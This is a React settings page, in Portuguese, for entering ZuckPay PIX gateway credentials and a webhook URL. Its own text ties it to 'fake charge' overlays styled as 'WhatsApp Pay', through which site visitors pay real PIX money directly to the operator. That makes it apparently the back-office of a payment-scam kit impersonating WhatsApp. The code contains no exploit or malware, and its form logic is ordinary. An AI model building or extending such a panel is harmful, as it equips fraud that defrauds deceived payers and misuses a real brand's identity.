import { useState, useEffect } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { getPaymentConfig, savePaymentConfig, type PaymentConfig } from '../services/paymentConfigService';
import { Zap, Check, AlertCircle, Eye, EyeOff, ExternalLink } from 'lucide-react';

const inputCls = "w-full bg-[#1c0510] border border-white/10 rounded-xl px-4 py-3 text-white text-sm placeholder-gray-600 focus:outline-none focus:border-green-500/60 focus:ring-1 focus:ring-green-500/20 transition-all font-mono";

export default function PaymentSettingsPage() {
  const qc = useQueryClient();
  const [clientId, setClientId] = useState('');
  const [clientSecret, setClientSecret] = useState('');
  const [showSecret, setShowSecret] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');

  const { data, isLoading } = useQuery<PaymentConfig>({
    queryKey: ['payment-config'],
    queryFn: getPaymentConfig,
  });

  useEffect(() => {
    if (data) setClientId(data.zuckpay_client_id);
  }, [data]);

  const saveMutation = useMutation({
    mutationFn: () => savePaymentConfig(clientId, clientSecret),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ['payment-config'] });
      setSuccess(true);
      setError('');
      setClientSecret('');
      setTimeout(() => setSuccess(false), 3000);
    },
    onError: (err: unknown) => {
      const msg = (err as { response?: { data?: { error?: { message?: string } } } })
        ?.response?.data?.error?.message;
      setError(msg ?? 'Erro ao salvar configuração.');
    },
  });

  const webhookUrl = `${window.location.origin.replace(':5173', ':8080')}/api/v1/webhooks/zuckpay`;

  return (
    <div className="p-6 max-w-xl mx-auto space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-white">Configurações</h1>
        <p className="text-gray-500 text-sm mt-0.5">Gateway PIX para cobranças nos overlays</p>
      </div>

      {/* Status card */}
      {!isLoading && data && (
        <div className={`rounded-2xl p-5 border flex items-start gap-4 ${
          data.configured
            ? 'bg-green-500/5 border-green-500/20'
            : 'bg-yellow-500/5 border-yellow-500/20'
        }`}>
          <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 ${
            data.configured ? 'bg-green-500/15' : 'bg-yellow-500/15'
          }`}>
            {data.configured
              ? <Check size={18} className="text-green-400" />
              : <AlertCircle size={18} className="text-yellow-400" />
            }
          </div>
          <div>
            <p className={`font-semibold text-sm ${data.configured ? 'text-green-400' : 'text-yellow-400'}`}>
              {data.configured ? 'ZuckPay configurado e ativo' : 'Integração não configurada'}
            </p>
            <p className="text-xs text-gray-500 mt-0.5">
              {data.configured
                ? 'Cobranças PIX nos overlays funcionarão normalmente.'
                : 'Overlays de cobrança falsa não vão funcionar sem as credenciais.'}
            </p>
          </div>
        </div>
      )}

      {/* Sobre ZuckPay */}
      <div className="bg-[#18181b] border border-white/5 rounded-2xl p-5 space-y-3">
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center">
            <Zap size={15} className="text-blue-400" />
          </div>
          <p className="text-sm font-semibold text-white">ZuckPay — Gateway PIX</p>
        </div>
        <p className="text-xs text-gray-500 leading-relaxed">
          Use o ZuckPay para receber pagamentos PIX reais quando os visitantes completarem
          cobranças nos overlays de "WhatsApp Pay". Os valores vão direto para sua conta.
        </p>
        <a
          href="https://www.zuckpay.com.br"
          target="_blank"
          rel="noreferrer"
          className="inline-flex items-center gap-1.5 text-xs text-blue-400 hover:text-blue-300 font-medium transition-colors"
        >
          Criar conta ZuckPay <ExternalLink size={11} />
        </a>
      </div>

      {/* Formulário */}
      <form
        onSubmit={(e) => { e.preventDefault(); saveMutation.mutate(); }}
        className="bg-[#18181b] border border-white/5 rounded-2xl p-5 space-y-4"
      >
        <p className="text-xs text-gray-500 uppercase tracking-wider font-medium">Credenciais da API</p>

        {success && (
          <div className="flex items-center gap-2 text-green-400 text-sm bg-green-500/10 border border-green-500/20 rounded-xl px-4 py-3">
            <Check size={15} />
            Credenciais salvas com sucesso!
          </div>
        )}
        {error && (
          <div className="flex items-start gap-2.5 text-red-400 text-sm bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-3">
            <AlertCircle size={15} className="mt-0.5 shrink-0" />
            {error}
          </div>
        )}

        <div className="space-y-1.5">
          <label className="text-xs font-medium text-gray-400">Client ID</label>
          <input
            required
            value={clientId}
            onChange={(e) => setClientId(e.target.value)}
            placeholder="seu_client_id"
            className={inputCls}
          />
        </div>

        <div className="space-y-1.5">
          <label className="text-xs font-medium text-gray-400">
            Client Secret
            {data?.configured && <span className="ml-2 text-gray-600">(em branco = manter atual)</span>}
          </label>
          <div className="relative">
            <input
              type={showSecret ? 'text' : 'password'}
              required={!data?.configured}
              value={clientSecret}
              onChange={(e) => setClientSecret(e.target.value)}
              placeholder="seu_client_secret"
              className={inputCls + ' pr-11'}
            />
            <button
              type="button"
              onClick={() => setShowSecret(v => !v)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300"
            >
              {showSecret ? <EyeOff size={16} /> : <Eye size={16} />}
            </button>
          </div>
        </div>

        <button
          type="submit"
          disabled={saveMutation.isPending}
          className="w-full bg-green-600 hover:bg-green-500 disabled:opacity-50 text-white font-semibold rounded-xl py-3 text-sm transition-all shadow-lg shadow-green-900/30"
        >
          {saveMutation.isPending ? (
            <span className="flex items-center justify-center gap-2">
              <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              Salvando…
            </span>
          ) : 'Salvar credenciais'}
        </button>
      </form>

      {/* Webhook */}
      <div className="bg-[#18181b] border border-white/5 rounded-2xl p-5 space-y-3">
        <p className="text-xs text-gray-500 uppercase tracking-wider font-medium">URL do Webhook</p>
        <p className="text-xs text-gray-500">Configure no painel ZuckPay para receber confirmações de pagamento:</p>
        <div className="flex items-center gap-2 bg-[#1c0510] border border-white/5 rounded-xl px-3 py-2.5">
          <code className="text-green-400 text-xs flex-1 break-all">{webhookUrl}</code>
          <button
            onClick={() => navigator.clipboard.writeText(webhookUrl)}
            className="text-gray-500 hover:text-white shrink-0"
          >
            <Check size={13} />
          </button>
        </div>
      </div>
    </div>
  );
}
